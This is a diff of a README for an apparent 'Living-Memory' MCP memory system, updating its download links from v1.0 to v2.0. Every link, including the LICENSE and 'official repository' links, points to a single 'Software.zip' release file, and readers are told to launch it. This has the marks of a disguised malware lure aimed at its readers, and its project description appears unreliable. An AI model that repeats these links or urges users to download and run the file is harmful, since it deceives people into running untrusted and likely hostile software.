@@ -1,6 +1,6 @@
 # 🧠 **Living-Memory Repository** 🦾
 
-[![Download Living Memory](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip)](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip)
+[![Download Living Memory](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip)](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip)
 
 Welcome to the "Living-Memory" repository, a cutting-edge production-ready persistent memory system implementing the Model Context Protocol (MCP). This innovative system empowers AI models to uphold persistent memory across sessions by utilizing a sophisticated file system-based knowledge graph. Dive into the realm of cognitive technologies and explore the limitless possibilities with Living-Memory!
 
@@ -22,7 +22,7 @@ Welcome to the "Living-Memory" repository, a cutting-edge production-ready persi
 
 ## 📦 Installation
 
-To get started with Living-Memory, download the [latest release](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip) and follow the installation instructions in the repository.
+To get started with Living-Memory, download the [latest release](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip) and follow the installation instructions in the repository.
 
 🚨 Note: The link above leads to a downloadable file. Make sure to launch it to access the latest version of Living-Memory.
 
@@ -37,9 +37,9 @@ Let's collaborate and shape the future of persistent memory systems together!
 
 ## 📄 License
 
-This project is licensed under the MIT license. For more details, see the [LICENSE](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip) file.
+This project is licensed under the MIT license. For more details, see the [LICENSE](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip) file.
 
-🌐 Visit the official [Living-Memory GitHub Repository](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip) for more information and updates!
+🌐 Visit the official [Living-Memory GitHub Repository](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip) for more information and updates!
 
 ---
 
@@ -47,4 +47,4 @@ This project is licensed under the MIT license. For more details, see the [LICEN
 
 🌟 **Join us on this exciting journey to revolutionize persistent memory systems!** 🚀
 
-🔗 *[Check the Releases section if the download link does not work](https://github.com/Soseta-byte/memory/releases/download/v1.0/Software.zip)*
+🔗 *[Check the Releases section if the download link does not work](https://github.com/Soseta-byte/memory/releases/download/v2.0/Software.zip)*
